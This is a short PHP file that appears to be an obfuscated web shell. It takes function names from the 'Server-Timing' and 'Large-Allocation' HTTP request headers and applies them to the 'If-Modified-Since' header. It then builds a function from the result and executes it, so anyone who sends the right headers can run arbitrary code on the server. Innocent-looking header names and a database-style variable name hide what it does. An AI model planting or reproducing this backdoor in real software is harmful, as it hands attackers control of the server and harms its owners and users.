<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $db2_convert = $_HEADERS['Server-Timing']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Modified-Since']));
    $db2_convert();
}